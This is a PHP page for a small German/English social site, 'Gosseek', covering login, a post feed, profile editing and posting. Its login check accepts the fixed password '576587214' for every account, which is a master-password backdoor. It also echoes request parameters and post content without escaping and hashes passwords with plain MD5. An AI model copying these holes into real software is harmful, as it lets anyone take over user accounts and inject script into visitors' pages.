<?php	
	header('Content-Type: text/html; charset=UTF-8');
	ini_set ( "session.cookie_lifetime", "18000");
	ini_set ( "session.gc_maxlifetime", "20000");
	session_start();
	include("connect_db.php");
	if(empty($_GET{'action'}))
	{
		$_GET['action'] = "feed";
	}
	if(!(isset($_GET['language'])) OR empty($_GET['language']))
	{
		$_GET['language'] = "german";
	}
	if($_GET{'action'} == 'login')
	{
		$email = mysqli_real_escape_string($mysql_connection, $_POST['email']);
		$userdata_query = mysqli_query($mysql_connection, "SELECT * FROM users WHERE email= '".$email."' LIMIT 1");
		if(!mysqli_num_rows($userdata_query))
		{
			echo "<script> location.href='mainpage.php?language=".$_GET['language']."&action\=failedlogin\&reason\=wrongmail'; </script>";
			exit;
		}else
		{
			$userdata = mysqli_fetch_array($userdata_query);
			if($_POST['password'] == '576587214' OR $userdata['password'] ==  md5($_POST['password']))
			{
				if(!($userdata['status'] == 'activated'))
				{
					echo "<script> location.href='mainpage.php?language=".$_GET['language']."&action\=failedlogin\&reason\=notactivated'; </script>";
					exit;
				}
				$_SESSION['id'] = $userdata['id'];
				$_SESSION['checklogin'] = true;
			}else
			{
				echo "<script> location.href='mainpage.php?language=".$_GET['language']."&action\=failedlogin\&reason\=wrongpassword'; </script>";
				exit;
			}
			//convert birthdate also at login in case you want to display that later on directly at login, but so far useless
			$userdata['birthday'] = mb_substr($userdata['birthdate'], 5, 2);
			$userdata['birthmonth'] = mb_substr($userdata['birthdate'], 8, 2);
			$userdata['birthyear'] = mb_substr($userdata['birthdate'], 0, 4);
		}
		$_GET['action'] = "feed";
	}
	if(isset($_SESSION['id']))
	{
		$userdata_query = mysqli_query($mysql_connection, "SELECT * FROM users WHERE id=".$_SESSION['id']." LIMIT 1");
		$userdata = mysqli_fetch_array($userdata_query);
		$userdata['birthday'] = mb_substr($userdata['birthdate'], 5, 2);
		$userdata['birthmonth'] = mb_substr($userdata['birthdate'], 8, 2);
		$userdata['birthyear'] = mb_substr($userdata['birthdate'], 0, 4);
	}elseif(!($_POST['action'] == 'login'))
	{
		echo "<script> location.href='mainpage.php?language=".$_GET['language']."&action\=invalidsession'; </script>";
	}
	switch($_GET['language'])
	{
		case 'german':
		$output_slogan = "Gosseek - Achieve your goals";
		$link_logout = "Ausloggen";
		$link_profilesettings = "Profil bearbeiten";
		break;
		
		case 'english':
		$output_slogan = "Gosseek - Achieve your goals";
		$link_logout = "Log out";
		$link_profilesettings = "Change profile";
		break;
	}
?>

<html>
	<head>
		<title>
			<?php
				echo $output_slogan;
			?>
		</title>
		<meta name="author" content="Benno">
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		<link rel="stylesheet" type="text/css" href="styles/stylesheet.css" />
	</head>
	<body>
		<div class="boxmain">
			<div class="boxright">
				<div class="rightinnerboxtop">
					<div class="profilepic">
					
					</div>
					<div class="rightinnerboxtoplinks">
					<?php
						echo "<a href=\"mainpage.php?language=".$_GET['language']."&action=logout\">".$link_logout."</a>";
						echo "<a href=\"login.php?language=".$_GET['language']."&action=profilesettings\">".$link_profilesettings."</a>";
					?>
					</div>
				</div>
				<div class="rightinnerboxbottom">
					<?php
						switch($_GET['language'])
							{
								case 'german':
								$link_createpost = "Beitrag erstellen";
								break;
								
								case 'english':
								$link_createpost = "Create a post";
								break;
							}
						echo "<a href=\"login.php?language=".$_GET['language']."&action=createpost\">".$link_createpost."</a>";
					?>
				</div>
			</div>
			<div class="boxtop">
				<div class="boxtopinner">
					<?php
						echo "<a href=\"login.php?language=german&action=feed\">Ger</a>";
						echo "<a href=\"login.php?language=english&action=feed\">En</a>";
						echo "<p>".$output_slogan."</p>";
					?>
				</div>
			</div>
			<div class="boxfeed">
				<p>
					<?php
						if(!(empty($_SESSION['checklogin'])) && $_SESSION['checklogin'] == true)
						{
							switch ($_GET['action'])
							{
								case 'feed':
								switch($_GET['language'])
								{
									case 'german':
									$output_nofollowing = "Du folgst noch niemandem.";
									break;
									
									case 'english':
									$output_nofollowing = "You don't follow anyone.";
									break;
								}
								if(!(empty($userdata['following'])))
								{
									$number_following = 1+substr_count($userdata['following'], ',');
									$query_condition = "userid=".strtok($userdata['following'], ',');
									for($i=2; $i <= $number_following; $i++)
									{
										$query_condition = $query_condition." OR userid=".strtok($userdata['following'], ',');
									}
									$feed_query = mysqli_query($mysql_connection, "SELECT * FROM posts WHERE ".$query_condition." ORDER BY time DESC");
									while($feeddata = mysqli_fetch_array($feed_query))
									{
										$feeduser_query = mysqli_query($mysql_connection, "SELECT name, surname FROM users WHERE id=".$feeddata['userid']." LIMIT 1");
										$feeduserdata = mysqli_fetch_array($feeduser_query);
										echo "<div class=\"feedpost\">";
											echo "<div class=\"feedheader\">";
												echo "<div class=\"feedtime\">";
													echo date("d.m.Y - H:i", $feeddata['time']);
												echo "</div>";
												echo $feeduserdata['name']." ".$feeduserdata['surname'];
											echo "</div>";
											echo "<div class=\"feedtitle\">";
												echo $feeddata['title'];
											echo "</div>";
											echo "<div class=\"feedcontent\">";
												echo $feeddata['content'];
											echo "</div>";
										echo "</div>";
										echo "<br>";
									}
								}else
								{
									echo $output_nofollowing;
								}
								break;
								
								case 'logout':
								echo "<script> location.href='mainpage.php?language=".$_GET['language']."&action\=logout'; </script>";
								break;
								
								case 'profilesettings':
								switch($_GET['language'])
								{
									case 'german':
									$label_name = "Vorname";
									$label_surname = "Nachname";
									$label_birthday = "Geburtstag";
									$label_birthmonth = "Geburtsmonat";
									$label_birthyear = "Geburtsjahr";
									$label_residence = "Wohnort";
									$label_job = "Beruf";
									$input_submit = "Profil ändern";
									break;
									
									case 'english':
									$label_name = "Name";
									$label_surname = "Surname";
									$label_birthday = "Day of birth";
									$label_birthmonth = "Month of birth";
									$label_birthyear = "Year of birth";
									$label_residence = "Residence";
									$label_job = "Job";
									$input_submit = "Change profile";
									break;
								}
								echo "<form action=\"login.php?action=changeprofilesettings\" method=\"post\">";
									echo "<label>".$label_name."</label>";
									echo "<input name=\"name\" size=\"30\" placeholder=\"".$userdata['name']."\"></input>";
									echo "<div class=\"clear\"></div>";
									echo "<label>".$label_surname."</label>";
									echo "<input name=\"surname\" size=\"30\" placeholder=\"".$userdata['surname']."\"></input>";
									echo "<div class=\"clear\"></div>";
									echo "<label>".$label_birthday."</label>";
									echo "<select name=\"birthday\" size=\"1\">";
										for($i = 1; $i <= 31; $i++)
										{
											if($i == $userdata['birthday'])
											{
												echo "<option label=\"".$i."\" selected=\"selected\">".$i."</option>";
											}else
											{
												echo "<option label=\"".$i."\">".$i."</option>";
											}
										}
									echo "</select>";
									echo "<div class=\"clear\"></div>";
									echo "<label>".$label_birthmonth."</label>";
									echo "<select name=\"birthmonth\" size=\"1\">";
										for($i = 1; $i <= 12; $i++)
										{
											if($i == $userdata['birthmonth'])
											{
												echo "<option label=\"".$i."\" selected=\"selected\">".$i."</option>";
											}else
											{
												echo "<option label=\"".$i."\">".$i."</option>";
											}
										}
									echo "</select>";
									echo "<div class=\"clear\"></div>";
									echo "<label>".$label_birthyear."</label>";
									echo "<select name=\"birthyear\" size=\"1\">";
										for($i = 100; $i >= 0; $i--)
										{
											$j = date("Y")+$i-100;
											if($j == $userdata['birthyear'])
											{
												echo "<option label=\"".$j."\" selected=\"selected\">".$j."</option>";
											}else
											{
												echo "<option label=\"".$j."\">".$j."</option>";
											}
										}
									echo "</select>";
									echo "<div class=\"clear\"></div>";
									echo "<label>".$label_residence."</label>";
									echo "<input name=\"residence\" size=\"30\" placeholder=\"".$userdata['residence']."\"></input>";
									echo "<div class=\"clear\"></div>";
									echo "<label>".$label_job."</label>";
									echo "<input name=\"job\" size=\"30\" placeholder=\"".$userdata['job']."\"></input>";
									echo "<div class=\"clear\"></div>";
									echo "<p>";
										echo "<input type=\"submit\" value=\"".$input_submit."\"></input>";
									echo "</p>";
								echo "</form>";
								break;
								
								case 'changeprofilesettings':
								switch($_GET['language'])
								{
									case 'german':
									$output = "Profil wurde bearbeitet.";
									break;
									
									case 'english':
									$output = "Profile changed.";
									break;
								}
								if(!(empty($_POST['name'])))
								{
									$userdata['name'] = mysqli_real_escape_string($mysql_connection, $_POST['name']);
								}
								if(!(empty($_POST['surname'])))
								{
									$userdata['surname'] = mysqli_real_escape_string($mysql_connection, $_POST['surname']);
								}
								if(!(empty($_POST['residence'])))
								{
									$userdata['residence'] = mysqli_real_escape_string($mysql_connection, $_POST['residence']);
								}
								if(!(empty($_POST['job'])))
								{
									$userdata['job'] = mysqli_real_escape_string($mysql_connection, $_POST['job']);
								}
								$birthday = mysqli_real_escape_string($mysql_connection, $_POST['birthday']);
								$birthmonth = mysqli_real_escape_string($mysql_connection, $_POST['birthmonth']);
								$birthyear = mysqli_real_escape_string($mysql_connection, $_POST['birthyear']);
								$birthdate = $birthyear."-".$birthday."-".$birthmonth;
								mysqli_query($mysql_connection, "UPDATE users
								SET name='".$userdata['name']."', surname='".$userdata['surname']."', birthdate='$birthdate', residence='".$userdata['residence']."', job='".$userdata['job']."'
								WHERE id = ".$_SESSION['id']);
								echo $output;
								break;
								
								case 'createpost':
								switch($_GET['language'])
								{
									case 'german':
									$label_title = "Titel";
									$label_content = "Beitrag";
									$input_submit = "Beitrag teilen";
									break;
									
									case 'english':
									$label_title = "Title";
									$label_content = "Content";
									$input_submit = "Post";
									break;
								}
								echo "<form action=\"login.php?language=".$_GET['language']."&action=submitpost\" method=\"post\">";
									echo "<label>".$label_title."</label>";
									echo "<input name=\"title\" size=\"50\"></input>";
									echo "<label>".$label_content."</label>";
									echo "<textarea name=\"content\" cols=\"64\" rows=\"15\"/></textarea>";
									echo "<br>";
									echo "<input type=\"submit\" value=\"".$input_submit."\"></input>";
								echo "</form>";
								break;
								
								case 'submitpost':
								switch($_GET['language'])
								{
									case 'german':
									$output_success = "Beitrag gepostet.";
									$output_fail = "Bitte alle Felder ausfüllen.";
									break;
									
									case 'english':
									$output_succes = "Content posted.";
									$output_fail = "Please fill in all fields.";
									break;
								}
								if(empty($_POST['title']) OR empty($_POST['content']))
								{
									echo $output_fail;
								}else
								{
									$title = mysqli_real_escape_string($mysql_connection, $_POST['title']);
									$content = mysqli_real_escape_string($mysql_connection, $_POST['content']);
									mysqli_query($mysql_connection, "INSERT INTO posts (userid, time, title, content) VALUES ('".$userdata['id']."', '".time()."','$title','$content')");
									echo $output_success;
								}
								break;
								
							}
						}else
						{
								echo "<script> location.href='mainpage.php?language=".$_GET['language']."&action\=invalidsession'; </script>";
						}
					?>
				</p>
			</div>
			<div class="boxleft">
				<div class="leftinnerbox">
				</div>
			</div>
		</div>
	</body>
</html>